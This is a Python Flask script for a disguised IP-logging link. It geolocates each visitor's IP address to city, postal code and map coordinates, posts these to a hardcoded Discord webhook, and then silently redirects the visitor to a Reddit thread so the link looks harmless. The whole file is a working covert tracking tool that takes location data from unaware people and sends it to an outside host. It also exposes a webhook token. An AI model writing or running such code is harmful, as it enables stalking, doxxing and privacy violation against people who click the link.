import geoip2.database
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# ===================== CONFIG =====================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430208752837066845/HFmlZHpwB_LgcbxjoFb47dvk4-5p6aWDDkKLVh_z2Oy_fBZT12DDkS4p-T8SXKkUEaTw"
GEOIP_DB_PATH = 'GeoLite2-City.mmdb'
REDIRECT_URL = "https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/?rdt=62221"

# Initialize GeoIP2 reader
reader = geoip2.database.Reader(GEOIP_DB_PATH)

# Keep track of already logged IPs to avoid duplicates
logged_ips = set()

def get_ip_info(ip):
    try:
        response = reader.city(ip)
        return {
            'ip': ip,
            'city': response.city.name or "Unknown",
            'region': response.subdivisions.most_specific.name or "Unknown",
            'country': response.country.name or "Unknown",
            'postal_code': response.postal.code or "Unknown",
            'latitude': response.location.latitude or 0,
            'longitude': response.location.longitude or 0
        }
    except geoip2.errors.AddressNotFoundError:
        return None

def send_to_discord(info):
    embed = {
        "username": "🌍 Visitor Bot",
        "embeds": [{
            "title": f"🚶‍♂️ New Visitor from {info['country']}",
            "description": "Visitor details:",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP & Location", "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['postal_code']}", "inline": False},
                {"name": "🌍 Google Maps Location", "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['latitude']},{info['longitude']})", "inline": False}
            ]
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=embed)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip not in logged_ips:
        info = get_ip_info(ip)
        if info:
            send_to_discord(info)
        logged_ips.add(ip)
    # Instant redirect to Reddit link
    return redirect(REDIRECT_URL, code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
